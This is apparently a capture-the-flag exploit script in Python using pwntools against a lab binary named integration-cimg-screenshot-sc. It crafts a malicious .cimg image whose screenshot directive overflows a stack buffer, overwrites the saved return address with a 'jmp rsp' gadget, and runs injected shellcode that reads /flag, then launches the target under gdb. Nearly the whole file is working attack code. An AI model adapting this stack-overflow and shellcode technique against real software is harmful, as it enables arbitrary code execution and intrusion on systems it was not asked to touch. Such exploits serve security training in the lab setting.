#!/usr/bin/env python3
import struct

from pwn import *

context.arch = "amd64"
context.os = "linux"

bin_path = "/challenge/integration-cimg-screenshot-sc"
elf = ELF(bin_path)


def build_exploit():
    # Find the 'jmp rsp' gadget in the RWX data segment (found at 0x40348b)
    jmp_rsp = next(elf.search(b"\xff\xe4", executable=True))
    log.info(f"Found jmp rsp at: {hex(jmp_rsp)}")

    # Standard shellcode to cat the flag
    sc = asm(shellcraft.cat("/flag"))

    # Address in the .bss/.data segment to prevent crash during state access
    # state + 0x20 + id*16 + 8 must be writable. 0x405000 is safe.
    writable_addr = 0x405000

    # Payload structure:
    # 136 bytes padding -> distance to rbx
    # 8 bytes rbx -> valid writable address
    # 24 bytes rbp, r12, r13 -> padding
    # 8 bytes rip -> jmp_rsp
    # shellcode
    payload_data = b"A" * 136 + p64(writable_addr) + b"B" * 24 + p64(jmp_rsp) + sc

    # Pad to total capture size (250 bytes)
    total_len = 250
    payload_data = payload_data.ljust(total_len, b"\x90")

    # Find a transparent character not in our payload to avoid rendering skips
    trans_char = 0
    for i in range(256):
        if i not in payload_data:
            trans_char = i
            break

    malicious_file = "/home/hacker/sc.bin"
    with open(malicious_file, "wb") as f:
        f.write(payload_data)

    # Build the .cimg file
    magic = b"cIMG"
    version = 4
    num_directives = 3
    global_w, global_h = 250, 250

    cimg = bytearray(
        struct.pack("<4sHBBI", magic, version, global_w, global_h, num_directives)
    )

    # 1. load_sprite_file: Load 250x1 horizontal sprite
    sp_w, sp_h = 250, 1
    cimg += struct.pack("<H", 5)
    cimg += struct.pack("<BBB", 1, sp_w, sp_h)  # id=1, width=250, height=1
    cimg += malicious_file.encode().ljust(255, b"\x00")

    # 2. render_sprite: Render at (0,0)
    # id=1, R=0, G=0, B=0, dst_x=0, dst_y=0, render_w=1, render_h=1, trans_char
    cimg += struct.pack("<H", 4)
    cimg += struct.pack("<BBBBBBBBB", 1, 0, 0, 0, 0, 0, 1, 1, trans_char)

    # 3. screenshot_to_sprite: Capture 250x1 row into sprite 2
    # This overflows the stack with the payload from FB[0][0..249]
    cap_w, cap_h = 250, 1
    cimg += struct.pack("<H", 0x539)
    cimg += struct.pack("<BBBBB", 2, 0, 0, cap_w, cap_h)

    with open("payload.cimg", "wb") as f:
        f.write(cimg)
    log.info("Payload generated as payload.cimg")


build_exploit()

io = gdb.debug(
    [bin_path, "payload.cimg"],
    env={"SHELL": "/bin/bash"},
    gdbscript="""
    b *0x00401f6a
    continue
    ni
    """,
)

io = process([bin_path, "payload.cimg"])

io.interactive()
